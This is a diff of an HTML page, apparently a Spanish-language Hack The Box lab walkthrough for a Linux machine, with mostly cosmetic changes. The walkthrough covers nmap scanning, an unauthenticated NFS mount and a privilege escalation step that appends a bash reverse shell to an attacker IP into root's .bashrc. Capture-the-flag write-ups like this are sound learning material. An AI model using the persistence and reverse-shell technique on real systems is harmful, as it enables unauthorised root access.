@@ -6,17 +6,24 @@
   <title>HTB - Inception | r4venn_</title>
   <link rel="stylesheet" href="/css/styles.css"/>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/monokai-sublime.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
 </head>
 <body>
   <div id="particles-js"></div>
+    <div class="terminal">
+      <h1 class="glitch-pages" data-text=">_r4ven">> Inception<span class="cursor">_</span></h1>
+      <a href="/walkthroughs.html" class="btn_back">/Go back?</a>
+    </div>
 
-  <div class="terminal">
-    <h1 class="glitch" data-text=">_ HTB - Inception">>_ HTB - Inception</h1>
-    <a class="btn" href="/">/back</a>
-  </div>
 
   <div id="markdown-container">
-    <h2>➤ Ficha técnica</h2>
+    <h2>Ficha técnica</h2>
+    
     <ul>
       <li><strong>Dificultad:</strong> Media</li>
       <li><strong>Sistema:</strong> Linux</li>
@@ -24,28 +31,30 @@
       <li><strong>Tags:</strong> NFS, BashRC, Privesc</li>
     </ul>
 
-    <h2>➤ Enumeración</h2>
+    <h2> Enumeración</h2>
     <p>Iniciamos con un escaneo agresivo para descubrir servicios:</p>
-    <pre><code>nmap -sC -sV -T4 10.10.10.67</code></pre>
+    <pre><code class="language-bash">nmap -sC -sV -T4 10.10.10.67</code></pre>
 
-    <h2>➤ Montaje NFS</h2>
+    <h2>Montaje NFS</h2>
     <p>Descubrimos que podemos montar un sistema remoto sin autenticación:</p>
-    <pre><code>sudo mount -t nfs 10.10.10.67:/ /mnt/nfs</code></pre>
+    <pre><code class="language-bash">sudo mount -t nfs 10.10.10.67:/ /mnt/nfs</code></pre>
 
-    <h2>➤ Escalada de privilegios</h2>
+    <h2>Escalada de privilegios</h2>
     <p>Accedemos al <code>.bashrc</code> de root, inyectamos shell reversa y reiniciamos sesión:</p>
-    <pre><code>echo "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1" >> /root/.bashrc</code></pre>
+    <pre><code class="language-bash">
+      echo "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1" >> /root/.bashrc
+    </code></pre>
 
-    <h2>➤ Root access</h2>
+    <h2>Root access</h2>
     <p>Recibimos conexión como root:</p>
     <pre><code>whoami
 root</code></pre>
 
-    <h2>➤ Flag</h2>
+    <h2>Flag</h2>
     <pre><code>cat /root/root.txt
 e3f29e...c02</code></pre>
 
-    <h2>➤ Autopwn Script</h2>
+    <h2>Autopwn Script</h2>
     <p>Para automatizar el proceso:</p>
     <pre><code class="language-python">#!/usr/bin/env python3
 import os
@@ -59,31 +68,28 @@ print("[+] Payload injected. Wait for root to reconnect.")
 </code></pre>
   </div>
 
+  
+  <<div class="social-sidebar">
+    <a href="https://app.hackthebox.com/profile/802825" target="_blank" title="Hack The Box">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" width="24" height="24" stroke-width="2">
+        <path d="M12 3l8 4.5v9l-8 4.5-8-4.5v-9l8-4.5"></path>
+        <path d="M12 12l8-4.5M12 12v9M12 12L4 7.5"></path>
+      </svg>
+    </a>
+  
+    <a href="https://github.com/venomcrane" target="_blank" title="GitHub">
+      <i class="fab fa-github"></i>
+    </a>
+  
+    <a href="https://www.linkedin.com/in/brandon-gachuz-6344b82b7/" target="_blank" title="LinkedIn">
+      <i class="fab fa-linkedin"></i>
+    </a>
+  </div>
+
+  
+
   <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
-  <script>
-    particlesJS("particles-js", {
-      particles: {
-        number: { value: 90 },
-        color: { value: "#39FF14" },
-        shape: { type: "circle" },
-        opacity: { value: 0.2 },
-        size: { value: 2 },
-        line_linked: {
-          enable: true,
-          distance: 150,
-          color: "#39FF14",
-          opacity: 0.2,
-          width: 1
-        },
-        move: { enable: true, speed: 1.2 }
-      },
-      interactivity: {
-        events: {
-          onhover: { enable: true, mode: "repulse" }
-        }
-      }
-    });
-  </script>
+  <script src="/js/main.js"></script>
 </body>
 </html>
 
